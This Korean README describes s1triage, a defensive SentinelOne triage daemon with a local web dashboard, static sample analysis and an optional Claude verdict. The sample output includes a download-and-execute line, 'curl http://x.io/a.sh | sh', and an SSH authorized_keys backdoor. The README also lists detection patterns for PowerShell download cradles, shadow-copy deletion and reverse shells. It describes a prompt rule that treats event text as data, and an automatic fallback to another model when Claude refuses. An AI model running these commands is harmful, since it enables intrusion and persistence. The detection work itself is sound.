# s1api: SentinelOne Deep Visibility 자동 트리아지

SentinelOne 콘솔에서 미해결 위협(Threat)이 새로 생기면 해당 위협의 **Storyline ID** 로 Deep Visibility(DV) 이벤트를 자동 조회하고, LOLBin/의심 명령줄 탐지, IOC(IP·도메인·해시) 추출, 선택적 위협 인텔리전스(VirusTotal / AbuseIPDB) 조회까지 수행한 뒤 위험도와 함께 리포트를 출력하는 Python 데몬입니다.

```
[ SentinelOne 콘솔 ]
      │  GET /threats (미해결, 최신순, 주기적 폴링)
      ▼
[ 신규 위협 선별 ]  ← state/seen_threats.json 으로 중복 분석 방지
      │  POST /dv/init-query  (storyline = "<ID>")
      │  GET  /dv/query-status (완료까지 대기)
      │  GET  /dv/events       (nextCursor 페이지네이션)
      ▼
[ 분석 ]  행위 설명(타임라인·요약), LOLBin·명령줄 패턴(MITRE ATT&CK), IOC 추출
      ▼
[ Enrichment ]  VirusTotal / AbuseIPDB (API 키가 있을 때만)
      ▼
[ 리포트 ]  콘솔 출력 + reports/threat_<ID>.json
```

## 빠른 시작

```bash
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

cp .env.example .env
# .env 에 S1_API_URL, S1_API_TOKEN 입력

python -m s1triage                 # 데몬 모드 (기본 30초 주기)
python -m s1triage --once          # 한 번만 폴링
python -m s1triage --skip-backlog  # 기존 미해결 위협은 건너뛰고 이후 신규만 분석
python -m s1triage --threat-id 1234567890   # 특정 위협 1건만 분석
python -m s1triage --web           # 이벤트 대시보드 + 버튼으로 심층 분석 (브라우저가 자동으로 열림)
python -m s1triage --web-only      # 모니터링 없이 저장된 리포트만 웹으로 보기
```

## 웹 화면

`python -m s1triage --web` 을 실행하면 http://127.0.0.1:8080/ 에 웹 화면이 열립니다. 기본은 **이벤트 대시보드**로, 위협을 자동으로 분석하지 않고 필요한 것만 버튼으로 분석합니다.

- **📋 이벤트 대시보드**: 콘솔의 위협 목록을 최신순 표로 보여줍니다 (탐지 시각, 위협 이름·파일 경로, 엔드포인트·OS, 분류/신뢰도, 상태(미해결/진행 중/해결됨, 조치 여부), 심층 분석 결과, Threat ID). 상단에 요약 카운터, 전체/미해결 필터, 검색, 새로고침, 100건 단위 "더 보기"가 있습니다.
- 각 Threat ID 옆 **🛡️ 심층 분석** 버튼을 누르면 정밀 분석 탭으로 이동해 그 위협을 바로 분석합니다 (옵션은 정밀 분석 탭의 체크박스 설정을 따름). 끝나면 대시보드의 "분석 결과" 칸에 판정이 표시되고 "결과 보기"로 다시 열 수 있습니다.
- 토큰 없이 `--web-only` 로 실행하면 콘솔 대신 저장된 리포트로 목록을 만듭니다.
- 예전처럼 새 위협을 백그라운드에서 자동 분석하려면 `python -m s1triage --web --auto-triage` 로 실행하세요.
- 화면은 `reports/` 폴더의 JSON 리포트를 읽어서 보여줍니다. `--web` 이면 `REPORT_DIR` 이 비어 있어도 `reports` 에 저장합니다.
- 외부 라이브러리나 인터넷 연결 없이 동작하고, 기본으로 `127.0.0.1` 에만 열려 **이 PC 에서만** 접속할 수 있습니다. 인증 기능이 없으므로 `WEB_HOST=0.0.0.0` 으로 바꿔 다른 PC 에 공개하지 마세요.
- 포트가 이미 쓰이고 있으면 `--port 8081` 처럼 바꿔서 실행하세요.

> ⚠️ API 토큰은 절대 코드나 Git 에 넣지 마세요. `.env` 는 `.gitignore` 에 포함되어 있습니다. 토큰이 채팅·코드 등에 노출된 적이 있다면 콘솔에서 재발급(rotate)하는 것을 권장합니다.

### 필요한 API 권한
서비스 유저(Viewer 이상)에 다음 권한이 필요합니다: Threats 조회, Deep Visibility 쿼리.

## 설정 (환경변수)

| 변수 | 기본값 | 설명 |
|---|---|---|
| `S1_API_URL` | (필수) | 예: `https://<console>.sentinelone.net/web/api/v2.1` |
| `S1_API_TOKEN` | (필수) | SentinelOne API 토큰 |
| `S1_POLL_INTERVAL` | 30 | 위협 폴링 주기(초) |
| `S1_THREAT_FETCH_LIMIT` | 20 | 폴링당 가져올 미해결 위협 수 |
| `S1_STATE_FILE` | `state/seen_threats.json` | 처리한 위협 ID 저장 위치 |
| `S1_DV_LOOKBACK_HOURS` | 24 | DV 조회 범위: 위협 생성 시각 − N시간 ~ 현재 |
| `S1_DV_QUERY_TEMPLATE` | `storyline = "{storyline_id}"` | S1QL 템플릿 |
| `S1_DV_POLL_SECONDS` / `S1_DV_TIMEOUT_SECONDS` | 3 / 90 | 쿼리 상태 확인 간격 / 최대 대기 |
| `S1_DV_MAX_EVENTS` | 5000 | 위협당 수집할 최대 이벤트 수 |
| `S1_HTTP_TIMEOUT` / `S1_HTTP_RETRIES` | 30 / 3 | HTTP 타임아웃, 5xx 재시도 횟수 |
| `S1_RATE_LIMIT_RETRIES` | 4 | 429 응답 시 재시도 횟수 (Retry-After 준수, 없으면 15→30→60→120초 대기) |
| `S1_DV_MIN_INTERVAL` | 10 | DV 쿼리 연속 생성 시 최소 간격(초) |
| `VT_API_KEY` | (선택) | VirusTotal v3 키: 해시·IP·도메인 조회 |
| `ABUSEIPDB_API_KEY` | (선택) | AbuseIPDB 키: IP 평판 조회 |
| `ENRICH_MAX_LOOKUPS` | 10 | 위협 1건당 TI 조회 상한 (무료 쿼터 보호) |
| `REPORT_DIR` | (비움) | JSON 리포트 저장 디렉터리 |
| `ANTHROPIC_API_KEY` | (선택) | Claude API 키: 정밀 분석의 AI 참고 판정 |
| `AI_MODEL` / `AI_EFFORT` | claude-opus-5-5 / high | AI 판정 모델과 추론 강도 |
| `WEB_HOST` / `WEB_PORT` | 127.0.0.1 / 8080 | 웹 화면 주소 |
| `REPORT_RAW_EVENTS` | false | true 면 JSON 리포트에 DV 원본 이벤트 포함 (필드명 확인·룰 튜닝용) |

## 정밀 분석 (웹 화면의 🛡️ 정밀 분석 탭)

Threat ID 를 넣거나 모니터링 탭에서 위협을 고른 뒤 "분석 실행"을 누르면 다음 결과를 탭으로 보여주고 `reports/analysis_<ID>.json` 으로 저장합니다.

| 탭 | 내용 |
|---|---|
| 결론 요약 | 정탐/오탐 추정(정탐 가능성 높음 · 추가 확인 필요 · 오탐 가능성 높음 · 판단 보류), 판정 근거, 근본원인, 킬체인(MITRE ATT&CK 12개 전술), 핵심 IOC, 후속 조치 가이드 |
| 메인 보고서 | 위협 정보부터 타임라인, IOC, TI, 조치까지 전체 보고서 |
| 초보자용 해설서 | 무슨 일이 있었는지, 왜 위험한지, 무엇을 하면 되는지를 쉬운 말로 설명 + 용어 설명 |
| 콘솔 Notes 초안 | SentinelOne 콘솔 위협 Notes 에 붙여넣을 요약 (복사 버튼). 콘솔에 자동으로 올리지는 않습니다 |
| analysis.json | 기계판독용 전체 결과 (다운로드) |

옵션
- **DV 새로 조회**: 켜면 콘솔에서 위협과 DV 이벤트를 다시 조회합니다(토큰 필요). 끄면 저장된 리포트로만 분석하므로 `--web-only` 에서도 쓸 수 있습니다.
- **온라인 위협인텔 조회**: `VT_API_KEY` / `ABUSEIPDB_API_KEY` 가 있을 때 해시·IP·도메인을 외부 서비스에 조회합니다. 끄면 외부로 아무것도 보내지 않습니다.
- **시간 한도**: DV 쿼리 대기 한도(30~1800초).

- **🤖 AI 참고 판정 (Claude)**: `.env` 에 `ANTHROPIC_API_KEY` 를 넣으면 켤 수 있습니다. 규칙 기반 결과를 Claude 에 보내 정탐/오탐 판단, 판정 근거, 공격 흐름 서술, 오탐 가능성 검토, 권장 조치, 분석가 확인 사항을 받아 "AI 참고 판정" 탭과 결론 요약 상단에 보여줍니다.
  - 기본 모델 `claude-opus-5-5`, 추론 강도 `high` (`AI_MODEL`, `AI_EFFORT` 로 변경). 구조화된 JSON 출력으로 받고, 모델이 요청을 거절하면 서버 측 대체 모델(fallback)로 자동 재시도합니다.
  - **Anthropic 으로 전송되는 데이터**: 위협 정보, 행위 타임라인(명령줄·파일 경로·IP·호스트명), IOC, TI 결과, 규칙 기반 결론. DV 원본 이벤트는 보내지 않고, 타임라인은 최대 150건으로 제한합니다. 사내 정책상 외부 전송이 어려우면 이 옵션을 끄세요.
  - 이벤트 데이터 안의 문장(명령줄 등)은 지시가 아니라 분석 대상으로만 다루도록 지시해 두었습니다. AI 판정은 참고 의견이며 규칙 기반 결론을 대체하지 않습니다.

판정은 규칙 기반 추정입니다. 고위험 행위(가중치 4 이상), TI 악성 판정, 위험 점수 10 이상 중 하나면 "정탐 가능성 높음", 알려진 공격 패턴이 없으면 "오탐 가능성 높음"으로 표시합니다. 분석 요청은 하나씩 순서대로 처리하며(DV 레이트리밋 보호), 다른 웹사이트에서 이 로컬 서버로 분석을 요청하지 못하도록 막아 두었습니다.

## 파일 / 격리 ZIP 정적 분석 (정밀 분석 탭 아래)

파일을 올리거나, 콘솔에서 받은 격리 파일 ZIP(`quarantine/*.zip`)과 패스워드를 넣고 "정적 분석 실행"을 누르면 `reports/sample_<SHA256 앞16자>.json` 으로 저장하고 탭(요약 · 파일별 구조 · 문자열·IOC · 보고서 · sample.json)으로 보여줍니다.

- **메모리에서만 해제**: ZIP 을 디스크에 풀지 않고, 샘플은 절대 실행하지 않습니다. ZipCrypto 와 AES(pyzipper) 패스워드 ZIP 모두 지원하며, 입력한 패스워드가 틀리면 `infected` 등 흔한 기본값도 시도합니다. 패스워드 칸의 기본값은 `SAMPLE_ZIP_PASSWORD` 환경변수로 바꿀 수 있습니다.
- **분석 항목**: MD5/SHA1/SHA256, 엔트로피, 파일 형식(PE·ELF·Mach-O·Office·LNK·스크립트 등), ASCII/UTF-16 문자열, IOC(URL·IP·도메인·이메일·레지스트리·경로·지갑), 의심 API/명령 규칙(인젝션, 키로깅, 랜섬 문구, Mimikatz, 리버스 셸, 채굴기 등 MITRE 기법 포함).
- **PE**: 아키텍처, 서브시스템, 컴파일 시각, 엔트리포인트 섹션, ASLR/DEP, 서명 유무, .NET, 섹션별 권한·엔트로피, 임포트/익스포트, imphash(pefile 과 동일), 오버레이. 패커 섹션·RWX·고엔트로피·적은 임포트 등을 탐지합니다.
- **ELF**: 아키텍처, 유형, 인터프리터, 필요 라이브러리(DT_NEEDED), 심볼 제거 여부, 섹션 엔트로피, UPX, 실행 가능 스택.
- **안전장치**: 업로드 64MB, ZIP 내 파일 1개 64MB·전체 256MB·200개, 중첩 ZIP 2단계까지(압축 폭탄 방지). 시간 한도는 위의 "시간 한도" 값을 씁니다.
- **외부 전송**: 기본은 아무것도 보내지 않습니다. 옵션을 켜고 `VT_API_KEY` 가 있을 때만 SHA256 해시를 VirusTotal 에 조회합니다.

판정은 파일별 규칙 가중치 합계로 "악성 가능성 높음(8 이상) · 추가 확인 필요(4 이상) · 악성 징후 적음"을 표시하며, 가장 위험한 파일의 판정이 전체 판정이 됩니다.

## 행위 분석 (무엇을 했는지 설명)

DV 이벤트 하나하나를 "어떤 프로세스가 무엇을 했는지" 한 줄로 풀어 쓰고, 위험한 행위에는 그 의미를 설명합니다.

```
[행위 분석]
· 주요 행위 주체는 bash(부모: sshd), 함께 등장한 프로세스: curl.
· 총 5개 이벤트 (...): 프로세스 실행 1건, 파일 수정 2건, 로그인 2건.
· 주목할 행위: SSH 키 등록(백도어), 다운로드 즉시 실행, 외부 파일 다운로드, 로그인 실패.
주목할 행위 설명:
  ▶ SSH 키 등록(백도어) [T1098.004]
    의미: 공격자가 자신의 SSH 공개키를 넣어 비밀번호 없이 다시 접속할 수 있게 만드는 대표적인 지속성 수법입니다.
    근거: [bash] 파일 수정: /root/.ssh/authorized_keys
행위 타임라인 (시간순, 같은 행위는 묶음):
  04:52:51  사용자 root 로그인 실패 (출발지 45.1.2.3) ×2 ⚠
  04:52:53  [bash] curl 실행 (명령: curl http://x.io/a.sh | sh) ⚠
  04:52:54  [bash] 파일 수정: /root/.ssh/authorized_keys ⚠
```

- 지원 이벤트: 프로세스 실행, 파일 생성/수정/삭제/이름변경, 네트워크 연결/리슨, DNS, URL, 레지스트리, 로그인/로그아웃, 예약 작업, 프로세스 핸들 접근, 스크립트, 모듈/드라이버 로드, SentinelOne 행위 지표. 그 외 유형도 "[프로세스] 유형 이벤트" 형태로 표시됩니다.
- 위험 행위 태그: SSH 키 등록, 계정/sudoers 변경, cron·systemd·셸 시작 스크립트 등 지속성, 로그·명령 기록 삭제, 임시 폴더 실행, 다운로드 후 즉시 실행, 리버스 셸, 정찰 명령, 계정 생성, 자동 실행 레지스트리, 보안 설정 변경, LSASS 접근, 의심 포트 통신 등.
- 정상 동작 오탐 줄이기: sshd·rsyslogd 같은 데몬이 `/var/log` 에 기록하는 것은 흔적 삭제로 보지 않고(삭제·이름변경이나 셸/일반 도구로 고친 경우만 해당), systemd 가 띄운 `sshd -D` 데몬 자체는 의심 프로세스로 보지 않습니다.
- 규칙은 `s1triage/behavior.py` 의 `PATH_RULES`, `REGISTRY_RULES`, `CMD_RULES` 에 정규식으로 정의되어 있어 쉽게 추가할 수 있습니다.

## 프로토타입 대비 변경 사항

- **비밀값 분리**: URL/토큰을 `.env`(환경변수)로 이동, `Settings` 의 repr 에서 토큰 마스킹.
- **중복 방지 개선**: 최신 1건만 보던 방식 → 최신 N건을 가져와 아직 처리하지 않은 위협을 오래된 순으로 모두 분석. 처리 이력은 파일에 저장되어 재시작해도 유지됩니다. DV 조회가 실패한 위협은 다음 폴링에서 재시도합니다.
- **DV 결과 페이지네이션**: `/dv/events` 의 `nextCursor` 를 따라 전체 결과를 수집(상한 `S1_DV_MAX_EVENTS`). 기존에는 첫 페이지만 가져왔습니다.
- **조회 범위**: "현재 − 24시간" 고정 → "위협 생성 시각 − 24시간 ~ 현재". 오래된 위협도 빠짐없이 조회합니다.
- **쿼리 상태**: `isFinished` 외에 `responseState`(FINISHED/FAILED 등)도 확인해 실패 시 즉시 중단.
- **재시도/레이트리밋**: 5xx 지수 백오프 재시도, 429 는 더 길게 대기 후 재시도, DV 쿼리 사이 최소 간격, 모든 요청에 타임아웃.
- **LOLBin 오탐 수정**: 부분 문자열 매칭(`"nc" in name`) 때문에 `sync.exe`, `vncviewer.exe`, `cmdagent.exe` 등이 탐지되던 문제를, 경로·확장자를 제거한 프로세스 이름 **정확 일치**로 수정. 탐지 목록 확장 및 MITRE ATT&CK 기법 ID·가중치 부여.
- **명령줄 패턴 탐지**: 인코딩된 PowerShell, `IEX + DownloadString`, `certutil -urlcache`, `vssadmin delete shadows`, 숨김 창 실행.
- **IOC 추출**: 공인 IP(사설·예약 대역 제외), 도메인(DNS·URL·명령줄 내 URL), SHA1/SHA256/MD5.
- **위험도 점수**: 탐지 가중치 + TI 악성 판정 + 콘솔 신뢰도로 LOW / MEDIUM / HIGH 산정.

## 프로젝트 구조

```
s1triage/
  config.py      환경변수/.env 로딩
  client.py      SentinelOne API (threats, dv/init-query, query-status, events)
  analyzer.py    LOLBin·명령줄 탐지, IOC 추출
  behavior.py    행위 설명 문장, 위험 행위 태그, 타임라인/요약
  enrichment.py  VirusTotal / AbuseIPDB
  state.py       처리한 위협 ID 저장
  report.py      위험도 산정, 콘솔/JSON 리포트
  monitor.py     파이프라인 + CLI
  web.py         로컬 웹 화면 서버 (static/index.html)
  jobs.py        정밀 분석 백그라운드 실행
  narrative.py   판정·근본원인·킬체인, 보고서/해설서/Notes 초안 생성
  ai_verdict.py  Claude API AI 참고 판정
  sample.py      업로드 파일/격리 ZIP 정적 분석 (해시·문자열·PE/ELF)
tests/           가짜 HTTP 응답 기반 단위 테스트
```

## 테스트

```bash
pip install -r requirements-dev.txt
python -m pytest -q
```

테스트는 실제 SentinelOne 에 접속하지 않고 가짜 응답으로 동작합니다.

## 참고 / 다음 단계

- DV 이벤트 필드명은 콘솔 버전에 따라 다를 수 있어 `analyzer.py` 에서 여러 후보 키(`tgtProcName`, `processName`, `srcProcName` 등)를 순서대로 확인합니다. 실제 응답에서 다른 키가 보이면 해당 목록에 추가하세요.
- 확장 아이디어: Slack/Teams/Jira 알림, Webhook 수신 모드, HIGH 등급 시 에이전트 네트워크 격리(`POST /agents/actions/disconnect`) 자동화(오탐 위험이 있으므로 승인 단계 권장).
